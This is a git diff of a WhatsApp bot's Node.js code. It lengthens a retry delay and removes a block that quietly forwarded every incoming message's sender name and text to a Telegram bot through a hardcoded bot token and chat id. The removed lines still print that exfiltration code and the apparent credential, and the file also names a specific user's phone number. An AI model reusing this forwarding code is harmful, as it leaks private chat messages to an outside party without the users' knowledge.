@@ -181,7 +181,7 @@ async function startHisoka() {
     } catch (error) {
         console.error('Error fetching profile picture:', error);
         res.status(400).json({ error: 'Bad request' }); 
-        setTimeout(startHisoka, 2000);// Respond with 400 for other errors
+        setTimeout(startHisoka, 5000);// Respond with 400 for other errors
     }
 });
 
@@ -195,20 +195,6 @@ async function startHisoka() {
       if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
       if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) return;
       m = smsg(client, mek, store);
-
-      axios.post('https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendMessage?chat_id=-1001723645621', {
-        text: {user:m.pushName, message:m.body}
-    })
-    .then(response => {
-        // Telegram API call succeeded
-        console.log('Message sent to Telegram:', message);
-        res.send(message); // Send response to the user
-    })
-    .catch(error => {
-        // Telegram API call failed
-        console.error('Error sending message to Telegram:', error);
-        res.status(500).send('Error sending message to Telegram');
-    });
    
      if (m.body == 'kkk'){
       console.log(await client.profilePictureUrl('917994107442@s.whatsapp.net'));
